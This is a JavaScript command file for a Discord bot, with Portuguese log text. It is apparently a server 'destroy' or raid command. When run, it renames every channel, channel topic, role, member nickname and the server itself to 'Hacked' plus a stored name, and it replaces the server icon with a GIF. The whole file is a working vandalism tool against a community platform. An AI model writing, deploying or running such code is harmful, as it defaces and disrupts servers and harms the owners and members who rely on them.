exports.run = async (client, message, args) => {
  let arg = require("./Nome.json").nome
    console.log(`Destroy Ordernado Por ${message.author.username} ID: ${message.author.id}`)
    function a1(){
        client.guilds.get(message.guild.id).channels.forEach((canal) => {
            canal.setTopic("Hacked " + arg)
            canal.setName("Hacked " + arg)
        })
       message.guild.setName("Hacked" + arg)
       client.guilds.get(message.guild.id).members.forEach((m) => {
           m.setNickname("Hacked " + arg)
       })
    }
    function b1(){
       message.guild.setIcon("https://media.tenor.com/images/71656fc182ad63d50fbcd7c5496aa09d/tenor.gif")
     client.guilds.get(message.guild.id).roles.forEach((r) => {
         r.setName("Hacked " + arg)
     })
    }
    function a2(){
        a1()
        b1()
    }
    a2()
}
